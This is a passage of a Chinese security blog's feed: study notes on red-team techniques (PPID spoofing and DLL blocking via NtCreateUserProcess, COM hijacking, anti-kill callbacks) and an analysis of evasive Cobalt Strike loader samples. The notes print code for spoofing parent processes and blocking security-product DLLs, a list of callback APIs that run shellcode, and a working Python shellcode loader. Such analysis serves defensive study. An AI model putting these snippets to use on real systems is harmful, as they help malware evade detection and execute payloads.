rel="external">KaynStrike</a>设计确实很巧妙，首先，工具分段把PE数据写入当前进程空间，然后拉起一个线程，并将EIP设置成之前那段数据的入口点，Resume之后，便执行了beacon代码，之后，主线程这边采用同样的方法执行NtFreeVirtualMemoryAPI函数，进行free。</li></ul><h2 id="0x05-COM-Hunter：C-编写的-COM-劫持持久化辅助工具"><a href="#0x05-COM-Hunter：C-编写的-COM-劫持持久化辅助工具" class="headerlink" title="0x05 COM-Hunter：C# 编写的 COM 劫持持久化辅助工具"></a>0x05 COM-Hunter：C# 编写的 COM 劫持持久化辅助工具</h2><ul><li><a href="https://github.com/nickvourd/COM-Hunter" target="_blank" rel="external">https://github.com/nickvourd/COM-Hunter</a>阅读了该工具的部分源码，其[内置]了一些可以被COM劫持的CLSID列表，没什么可说的。关于如何狩猎可以被COM劫持的CLSID可以参考<a href="https://www.4hou.com/posts/Mo51" target="_blank" rel="external">持久性COM劫持的实现 - 嘶吼</a>等文章，除此以外<a href="https://github.com/findream/SecStudy/blob/main/ATT-CK/Remote-ComHiJack/ReadMe.md" target="_blank" rel="external">我的github</a>上有一个可以远程狩猎COM劫持的工具。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-绿盟科技-每周蓝军技术推送（2022-5-28-6-2）&quot;&gt;&lt;a href=&quot;#0x00-绿盟科技-每周蓝军技术推送（2022-5-28-6-2）&quot; class=&quot;headerlink&quot; title=&quot;0x00 绿盟科技-每周蓝军技术推送（2022.5.28-6.2）&quot;&gt;&lt;/a&gt;0x00 绿盟科技-每周蓝军技术推送（2022.5.28-6.2）&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;原文链接：&lt;a href=&quot;https://mp.weixin.qq.com/s/aZ3Af7xHOuqKGI_R89U0Fg&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;每周蓝军技术推送（2022.5.28-6.2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;这一周的内容推送主要是一些工具推荐&lt;/li&gt;
&lt;li&gt;释放UDRL（用户定义反射加载器）内存的BOF&lt;/li&gt;
&lt;li&gt;基于低熵的香农编码隐藏shellcode&lt;/li&gt;
&lt;li&gt;Cobalt Strike Beacon 的用户定义反射加载器，伪造线程起始地址并在执行入口点后释放&lt;/li&gt;
&lt;li&gt;C# 编写的 COM 劫持持久化辅助工具
    
    </summary>
    
      <category term="攻防技术" scheme="https://findream.github.io/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>绿盟科技-每周蓝军技术推送（2022.5.14-5.20）学习</title>
    <link href="https://findream.github.io/2022/05/29/%E7%BB%BF%E7%9B%9F%E7%A7%91%E6%8A%80-%E6%AF%8F%E5%91%A8%E8%93%9D%E5%86%9B%E6%8A%80%E6%9C%AF%E6%8E%A8%E9%80%81(2022.5.14-5.20)/"/>
    <id>https://findream.github.io/2022/05/29/绿盟科技-每周蓝军技术推送(2022.5.14-5.20)/</id>
    <published>2022-05-29T06:02:11.000Z</published>
    <updated>2022-06-14T13:10:09.303Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-每周蓝军技术推送（2022-5-14-5-20）"><a href="#0x00-每周蓝军技术推送（2022-5-14-5-20）" class="headerlink" title="0x00 每周蓝军技术推送（2022.5.14-5.20）"></a>0x00 每周蓝军技术推送（2022.5.14-5.20）</h2><ul><li>这一周的推送，主要学习了三部分内容：</li><li>篡改注册表与ETW，隐匿执行计划任务</li><li>使用NtCreateUserProcess进行PPID欺骗 和BlockDLL</li><li>Windows环境下的自保护探究<a id="more"></a></li></ul><h2 id="0x01-PPID-Spoofing-amp-BlockDLLs-with-NtCreateUserProcess"><a href="#0x01-PPID-Spoofing-amp-BlockDLLs-with-NtCreateUserProcess" class="headerlink" title="0x01 PPID Spoofing &amp; BlockDLLs with NtCreateUserProcess"></a>0x01 PPID Spoofing &amp; BlockDLLs with NtCreateUserProcess</h2><ul><li><p>在<a href="https://offensivedefence.co.uk/posts/ntcreateuserprocess/" target="_blank" rel="external">这篇文章中</a>，作者介绍了如何使用<code>NtCreateUserProcess</code>这一个未被官方文档化的API函数，NtCreateUserProcess函数是CreateProcessA(W)的底层实现。可以规避部分EDR的检测。</p></li><li><p>作者的灵感来源是来自Capt. Meelo的<a href="https://captmeelo.com/redteam/maldev/2022/05/10/ntcreateuserprocess.html" target="_blank" rel="external">Making NtCreateUserProcess Work</a>一文，NtCreateUserProcess的函数原型如下：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">NTSTATUS</div><div class="line">NTAPI</div><div class="line">NtCreateUserProcess(</div><div class="line">    <span class="variable">_Out_</span> PHANDLE ProcessHandle,</div><div class="line">    <span class="variable">_Out_</span> PHANDLE ThreadHandle,</div><div class="line">    <span class="variable">_In_</span> ACCESS_MASK ProcessDesiredAccess,</div><div class="line">    <span class="variable">_In_</span> ACCESS_MASK ThreadDesiredAccess,</div><div class="line">    <span class="variable">_In_opt_</span> POBJECT_ATTRIBUTES ProcessObjectAttributes,</div><div class="line">    <span class="variable">_In_opt_</span> POBJECT_ATTRIBUTES ThreadObjectAttributes,</div><div class="line">    <span class="variable">_In_</span> ULONG ProcessFlags,</div><div class="line">    <span class="variable">_In_</span> ULONG ThreadFlags,</div><div class="line">    <span class="variable">_In_</span> PRTL_USER_PROCESS_PARAMETERS ProcessParameters,</div><div class="line">    <span class="variable">_Inout_</span> PPS_CREATE_INFO CreateInfo,</div><div class="line">    <span class="variable">_In_</span> PPS_ATTRIBUTE_LIST AttributeList</div><div class="line">);</div></pre></td></tr></table></figure></li><li><p><code>ProcessHandle</code>和<code>ThreadHandle</code>分别是需要传出的进程和线程句柄，可以为NULL。</p></li></ul><ul><li><p><code>ProcessDesiredAccess</code>和<code>ThreadDesiredAccess</code>是进程和线程访问权限掩码。可以直接为PROCESS_ALL_ACCESS和THREAD_ALL_ACCESS，具体可以参见以下文档,</p><ul><li><a href="https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights" target="_blank" rel="external">进程安全和访问权限</a></li><li><a href="https://docs.microsoft.com/en-us/windows/win32/procthread/thread-security-and-access-rights" target="_blank" rel="external">线程安全和访问权限</a></li></ul></li><li><p><code>ProcessObjectAttributes</code>和<code>ThreadObjectAttributes</code>是进程和线程对象属性，指向OBJECT_ATTRIBUTES结构，此处可以为<code>NULL</code></p></li><li><p><code>ProcessFlags</code>和<code>ThreadFlags</code>是进程线程标志，Meelo是查看ProcessHack源码获得的，此处可以为NULL</p></li><li><p><code>ProcessParameters</code>是进程参数信息，指向的是<code>RTL_USER_PROCESS_PARAMETERS</code>结构，通过逆向CreateProcessA函数，可以发现使用<code>RtlCreateProcessParametersEx</code>进行初始化</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="string">UNICODE_STRING</span> <span class="string">NtImagePath;</span></div><div class="line"><span class="string">RtlInitUnicodeString(&amp;NtImagePath,</span> <span class="string">(PWSTR)L"\\??\\C:\\Windows\\System32\\mmc.exe");</span></div><div class="line"><span class="string">PRTL_USER_PROCESS_PARAMETERS</span> <span class="string">ProcessParameters</span> <span class="string">=</span> <span class="literal">NULL</span><span class="string">;</span></div><div class="line"><span class="string">RtlCreateProcessParametersEx(&amp;ProcessParameters,</span> <span class="string">&amp;NtImagePath,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="string">RTL_USER_PROCESS_PARAMETERS_NORMALIZED);</span></div></pre></td></tr></table></figure></li><li><p>CreateInfo是一个指向<code>PS_CREATE_INFO</code>结构的指针，对于PS_CREATE_INFO结构的初始化也很简单。</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// process create info</span></div><div class="line">PS_CREATE_INFO CreateInfo = &#123; <span class="number">0</span> &#125;;</div><div class="line">CreateInfo.Size = sizeof(CreateInfo);</div><div class="line">CreateInfo.State = PsCreateInitialState;</div></pre></td></tr></table></figure></li><li><p>最后一个参数是<code>AttributeList</code>，AttributeList指向的是PPS_ATTRIBUTE_LIST结构体，这是一个链表结构，可以通过RtlAllocateHeap函数自主申请链表的大小。在第一个节点中,必须要添加PS_ATTRIBUTE_IMAGE_NAME（进程映像名）这个属性。</p><figure class="highlight thrift"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PS_ATTRIBUTE_LIST</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">SIZE_T TotalLength;                 <span class="comment">// sizeof(PS_ATTRIBUTE_LIST)</span></div><div class="line">PS_ATTRIBUTE Attributes[<span class="number">2</span>];         <span class="comment">// Depends on how many attribute entries should be supplied to NtCreateUserProcess</span></div><div class="line">&#125; PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;</div></pre></td></tr></table></figure></li></ul><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// initialise attribute list</span></div><div class="line">PPS_ATTRIBUTE_LIST AttributeList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE) * <span class="number">3</span>);</div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>TotalLength = sizeof(PS_ATTRIBUTE_LIST);</div><div class="line"><span class="comment">// set image name</span></div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">0</span>].Attribute = PS_ATTRIBUTE_IMAGE_NAME;</div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">0</span>].Size = NtImagePath.Length;</div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">0</span>].Value = (ULONG_PTR)NtImagePath.Buffer;</div></pre></td></tr></table></figure><ul><li><p>作者在这篇文章中主要实现了两个功能，一个是PPID Spoofing，也就是父进程欺骗，另外一个是BlockDLLs，BlockDLLs简单的来说就是阻止一些非可信的DLL模块加载到进程中。</p></li><li><p>进程隐藏可以通过设置进程的Attribute即可，具体操作如下,将进程的PS_ATTRIBUTE_PARENT_PROCESS(父进程)属性设置为指定的父进程的Handle即可。：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// add parent process attribute</span></div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">1</span>].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;</div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">1</span>].Size = sizeof(HANDLE);</div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">1</span>].ValuePtr = hParent;</div></pre></td></tr></table></figure></li><li><p>BlockDLLs允许系统根据不同的策略加载不同安全等级的Dll文件，因为一些安全软件会通过往进程中加载dll来进行行为监控，利用这个特性就可以阻止非windows的dll加载，包括安全软件的dll。<a href="https://paper.seebug.org/929/" target="_blank" rel="external">这里</a>可以看到完整的BlockDlls的介绍,主要有两种方法。</p><ul><li><p>通过<code>SetProcessMitigationPolicy</code>函数设置阻止策略。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY policy;</div><div class="line">policy.MitigationOptIn = 1;</div><div class="line">SetProcessMitigationPolicy(ProcessSignaturePolicy, &amp;policy, sizeof(policy))</div></pre></td></tr></table></figure></li><li><p>通过UpdateProcThreadAttribute修改线程属性。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">DWORD64 ProtectionLevel = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON<span class="comment">; //policy.MitigationOptIn</span></div><div class="line">UpdateProcThreadAttribute(<span class="name">si</span>.lpAttributeList, <span class="number">0</span>, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, <span class="symbol">&amp;ProtectionLevel</span>, sizeof(<span class="name">ProtectionLevel</span>), NULL, NULL)</div></pre></td></tr></table></figure></li></ul></li></ul><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// blockdlls policy</span></div><div class="line">DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;</div><div class="line"><span class="comment">// add process mitigation atribute</span></div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">2</span>].Attribute = PS_ATTRIBUTE_MITIGATION_OPTIONS_2;</div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">2</span>].Size = sizeof(DWORD64);</div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">2</span>].ValuePtr = &amp;policy;</div></pre></td></tr></table></figure><ul><li><p>Ref:<a href="https://offensivedefence.co.uk/posts/ntcreateuserprocess/" target="_blank" rel="external">PPID Spoofing &amp; BlockDLLs with NtCreateUserProcess</a></p></li><li><p>Ref:<a href="[https://paper.seebug.org/929/](https://paper.seebug.org/929/">关于 CS 的 Blockdll 实现的个人 POC</a>)</p></li><li><p>Ref:<a href="https://captmeelo.com/redteam/maldev/2022/05/10/ntcreateuserprocess.html" target="_blank" rel="external">Making NtCreateUserProcess Work</a></p></li><li><p>Ref:<a href="https://github.com/capt-meelo/NtCreateUserProcess/blob/master/main.cpp" target="_blank" rel="external">https://github.com/capt-meelo/NtCreateUserProcess/blob/master/main.cpp</a></p></li></ul><h2 id="0x02-Windows环境下的自保护探究"><a href="#0x02-Windows环境下的自保护探究" class="headerlink" title="0x02 Windows环境下的自保护探究"></a>0x02 Windows环境下的自保护探究</h2><ul><li>这篇文章作者的思路是这样的，在kill 杀软进程的时候，会使用OpenProcess打开杀软进程，在OPenProcessAPI函数底层呢，会调用ObRegisterCallbacks注册回调函数，所以作者的目的就是通过注册回调函数，首先判断当前进程ID是否是杀软自身的PID，如果是的话，则去除Kill进程的权限。<figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O<span class="function"><span class="title">perationInformation</span>-&gt;</span>P<span class="function"><span class="title">arameters</span>-&gt;</span>CreateHandleInformation.DesiredAccess &amp;= ~PROCESS_TERMINATE;</div></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-每周蓝军技术推送（2022-5-14-5-20）&quot;&gt;&lt;a href=&quot;#0x00-每周蓝军技术推送（2022-5-14-5-20）&quot; class=&quot;headerlink&quot; title=&quot;0x00 每周蓝军技术推送（2022.5.14-5.20）&quot;&gt;&lt;/a&gt;0x00 每周蓝军技术推送（2022.5.14-5.20）&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;这一周的推送，主要学习了三部分内容：&lt;/li&gt;
&lt;li&gt;篡改注册表与ETW，隐匿执行计划任务&lt;/li&gt;
&lt;li&gt;使用NtCreateUserProcess进行PPID欺骗 和BlockDLL&lt;/li&gt;
&lt;li&gt;Windows环境下的自保护探究
    
    </summary>
    
      <category term="攻防技术" scheme="https://findream.github.io/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>CobaltStrike高免杀样本分析</title>
    <link href="https://findream.github.io/2022/05/25/CobaltStrike%E9%AB%98%E5%85%8D%E6%9D%80%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    <id>https://findream.github.io/2022/05/25/CobaltStrike高免杀样本分析/</id>
    <published>2022-05-25T06:02:11.000Z</published>
    <updated>2022-06-14T13:11:35.494Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;近期，在狩猎中，捕获到一批高度免杀的CobaltStrike样本，经过分析，目前这些免杀样本具备以下几种特征，第一，不在拘泥于传统的C++作为编程语言，也会采用C#或者Golang，或者脚本语言也会在整个攻击链中使用不同的语言，使用C++可能对使用者的要求有所提高，但是免杀效果可能更好。第二，对于shellcode的加密方式，不在拘泥于传统的异或或者AES，Base等公开的加密编码算法，也会采用一些好玩的，个性化的编码算法进行shellcode加密。第三，在开辟内存空间的时候，也不在使用传统的VirtualAlloc等R3层的API函数，更多的使用基于底层的API函数，第四，在调用shellcode过程中，也不像往常一样使用常规的方式调用shellcode，而是利用一些API的机制(CreateThread)，或者回调机制(EnumSystemLocalesW)，以及APC。<br><a id="more"></a></p><h2 id="0x01-Example1"><a href="#0x01-Example1" class="headerlink" title="0x01 Example1"></a>0x01 Example1</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个loader由C#编写，通过<code>powerShell.AddScript(@string);</code>加载加密过的Powershell脚本，然后通过<code>powerShell.BeginInvoke</code>执行。<br>   <img src="http://hacky.wang/blog/20220525/qaXTWKJGj3oG.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20220525/igppaXzAbCFp.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第2层powershell脚本中，依旧是执行Base64加密/编码过的Powershell语句<br>   <img src="http://hacky.wang/blog/20220525/D2dzLkeJRY7N.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;经过解码得到解码之后的Powershell脚本。第三层Powershell脚本逻辑也很清楚，首先解码一段base64，然后进行xor解密，获得一段shellcode，然后将解密获得的shellcode复制到内存中并执行。<br>   <img src="http://hacky.wang/blog/20220525/M1sraJ1PX2zv.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;经过分析，转储而来的shellcode是典型的cobaltstrike生成stageless类型的shellcode。也就是所谓的分离式免杀的操作。<br>   <img src="http://hacky.wang/blog/20220525/HlfthlTWfRdY.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20220525/d87EH0lvK6Ee.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其本质还是一个download。其会加载winnet.dll模块，然后依次调用<code>wininet!InternetOpenA</code>,<code>wininet!InternetConnectA</code>,<code>KERNEL32!VirtualAllocStub</code>,<code>wininet!InternetReadFile</code>等网络读取函数读取服务端获取的payload。最终在栈顶保存的是读取的payload的地址，待到函数返回，执行流跳转到payload处。<br>   <img src="http://hacky.wang/blog/20220525/4X5BfKPs0xA7.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20220525/yKFGpzN5ieTG.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以看到下载的bin主要有两部分组成，一个是引导shellcode，第二部分是payload，主要用来引导执行payload。这也是cobaltstrike特征之一。<br>   <img src="http://hacky.wang/blog/20220525/Ay4yTDOvlt4L.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;显然，熟悉beacon的一眼就看到了cobaltstrike特征，这是beacon的PE文件，在默认生成的beacon文件中，这是导出的ReflectiveLoad函数，处理完PE数据之后，最终调用DllEntry函数进行后续的处理。<br>   <img src="http://hacky.wang/blog/20220525/iDDm7IHUMk2j.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20220525/3LNMGFde8eGf.png?imageslim" alt="mark"></p><h2 id="0x02-Example2"><a href="#0x02-Example2" class="headerlink" title="0x02 Example2"></a>0x02 Example2</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://www.virustotal.com/gui/file/d0db40a4683de999dc11be3c8e5599363f21398a0a25c238dab1a680a2029d1f" target="_blank" rel="external">这个loader</a>使用GoLang编写，该样本并没有去除符号表，首先，检查系统的CPU个数和逻辑分区个数，如果CPU个数和逻辑分区个数小于4的话，则退出。<br>   <img src="http://hacky.wang/blog/20220528/hnHKiFkl7LGW.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后调用HeapCreate开辟内存空间，Golang编译的程序在汇编层面的函数调用方式和C++编译的有些许差异，在x64下，通过[eax]进行压栈传入参数，然后将需要调用的函数传入rax寄存器中，rcx保存的是参数的个数。并调用ZwAllocateVirtualMemory修改内存属性。<br>   <img src="http://hacky.wang/blog/20220528/qTyCrfDxjyGe.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20220528/4d9ddEWAr28n.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;16个字节组成的Byte[],如果需要将shellcode转化为UUID形式的话，如果shellcode长度不足16的话，将自动补齐。在CobaltStrike免杀样本中，UUID是以字符串形式存在于内存中，其通过API函数<code>UuidFromStringA</code>将其转化为UUID格式。<br>   <img src="http://hacky.wang/blog/20220528/hYXCzF2FThsV.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后，通过<code>EnumSystemLocalesW</code>函数通过回调的方式执行shellcode，同样的可以进行回调的还有以下函数<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>, EnumTimeFormatsA</div><div class="line"><span class="number">2</span>, EnumWindows</div><div class="line"><span class="number">3</span>, EnumDesktopWindows</div><div class="line"><span class="number">4</span>, EnumDateFormatsA</div><div class="line"><span class="number">5</span>, EnumChildWindows</div><div class="line"><span class="number">6</span>, EnumThreadWindows</div><div class="line"><span class="number">7</span>, EnumSystemLocales</div><div class="line"><span class="number">8</span>, EnumSystemGeoID</div><div class="line"><span class="number">9</span>, EnumSystemLanguageGroupsA</div><div class="line"><span class="number">10</span>, EnumUILanguagesA</div><div class="line"><span class="number">11</span>, EnumSystemCodePagesA</div><div class="line"><span class="number">12</span>, EnumDesktopsW</div><div class="line"><span class="number">13</span>, EnumSystemCodePagesW</div></pre></td></tr></table></figure></p><p>   <img src="http://hacky.wang/blog/20220528/181EYINyufLB.png?imageslim" alt="mark"></p><h2 id="0x03-Example3"><a href="#0x03-Example3" class="headerlink" title="0x03 Example3"></a>0x03 Example3</h2><ul><li><p>看图标和关键字显然，这是由<code>pyinstaller</code>打包而成的exe文件。目前常见的py打包工具主要有<code>pyinstaller</code>，<code>py2exe</code>,以及<code>cx_Freeze</code><br> <img src="http://hacky.wang/blog/20220530/eb0JbgWba5hY.png?imageslim" alt="mark"></p></li><li><p>针对<code>pyinstaller</code>打包而来的exe，可以使用<code>pyinstxtractor.py</code>进行解包，完成后，会在同目录生成一个extracted结尾的文件夹，在文件夹中，有两个没有后缀的文件，其中必然有一个名为struct文件。<br> <img src="http://hacky.wang/blog/20220530/6zXGpMBrmt4Q.png?imageslim" alt="mark"></p></li><li><p>那个名字为1的文件是一个抹去了时间戳和Magic的pyc文件，而抹去的信息可以在struct文件中找到，只需要复制<code>struct</code>文件的前16个字节复制到<code>1</code>这个文件中，即可。<br> <img src="http://hacky.wang/blog/20220530/oHHX0edBXdPT.png?imageslim" alt="mark"></p></li><li><p>然后使用在线的pyc2py的网站<a href="https://tool.lu/pyc/" target="_blank" rel="external">https://tool.lu/pyc/</a>就可以得到py代码如下。使用伪随机数解密，因为随机数种子是固定的，因为产生的随机数也是固定的。解密秘钥也就是固定的。loader是shellcode装载器，value是解密的shellcode。<br> <img src="http://hacky.wang/blog/20220530/BalqeFPTQs2s.png?imageslim" alt="mark"></p></li><li><p>loader代码如下，很常见的加载方式</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">shellcode = binascii.a2b_hex(value)</div><div class="line">ctypes<span class="selector-class">.windll</span><span class="selector-class">.kernel32</span><span class="selector-class">.VirtualAlloc</span><span class="selector-class">.restype</span>=ctypes.c_uint64</div><div class="line">rwxpage = ctypes<span class="selector-class">.windll</span><span class="selector-class">.kernel32</span><span class="selector-class">.VirtualAlloc</span>(<span class="number">0</span>, len(shellcode), <span class="number">0</span>x1000, <span class="number">0</span>x40)</div><div class="line">ctypes<span class="selector-class">.windll</span><span class="selector-class">.kernel32</span><span class="selector-class">.RtlMoveMemory</span>(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(shellcode), len(shellcode))</div><div class="line">handle = ctypes<span class="selector-class">.windll</span><span class="selector-class">.kernel32</span><span class="selector-class">.CreateThread</span>(<span class="number">0</span>, <span class="number">0</span>, ctypes.c_uint64(rwxpage), <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</div><div class="line">ctypes<span class="selector-class">.windll</span><span class="selector-class">.kernel32</span><span class="selector-class">.WaitForSingleObject</span>(handle, -<span class="number">1</span>)</div></pre></td></tr></table></figure></li><li><p>而shellcode是很明显的coabaltstrike的shellcode。<br> <img src="http://hacky.wang/blog/20220530/xKfvVYsjc1eo.png?imageslim" alt="mark"></p></li><li><p>Ref:<a href="https://xz.aliyun.com/t/10450#toc-8" target="_blank" rel="external">https://xz.aliyun.com/t/10450#toc-8</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-背景&quot;&gt;&lt;a href=&quot;#0x00-背景&quot; class=&quot;headerlink&quot; title=&quot;0x00 背景&quot;&gt;&lt;/a&gt;0x00 背景&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;近期，在狩猎中，捕获到一批高度免杀的CobaltStrike样本，经过分析，目前这些免杀样本具备以下几种特征，第一，不在拘泥于传统的C++作为编程语言，也会采用C#或者Golang，或者脚本语言也会在整个攻击链中使用不同的语言，使用C++可能对使用者的要求有所提高，但是免杀效果可能更好。第二，对于shellcode的加密方式，不在拘泥于传统的异或或者AES，Base等公开的加密编码算法，也会采用一些好玩的，个性化的编码算法进行shellcode加密。第三，在开辟内存空间的时候，也不在使用传统的VirtualAlloc等R3层的API函数，更多的使用基于底层的API函数，第四，在调用shellcode过程中，也不像往常一样使用常规的方式调用shellcode，而是利用一些API的机制(CreateThread)，或者回调机制(EnumSystemLocalesW)，以及APC。&lt;br&gt;
    
    </summary>
    
      <category term="windows 攻防" scheme="https://findream.github.io/categories/windows-%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>绿盟科技-每周蓝军技术推送（2022.4.30-5.6）学习</title>
    <link href="https://findream.github.io/2022/05/10/%E7%BB%BF%E7%9B%9F%E7%A7%91%E6%8A%80-%E6%AF%8F%E5%91%A8%E8%93%9D%E5%86%9B%E6%8A%80%E6%9C%AF%E6%8E%A8%E9%80%81%EF%BC%882022.4.30-5.6)/"/>
    <id>https://findream.github.io/2022/05/10/绿盟科技-每周蓝军技术推送（2022.4.30-5.6)/</id>
    <published>2022-05-10T06:02:11.000Z</published>
    <updated>2022-05-23T11:44:46.297Z</updated>
    
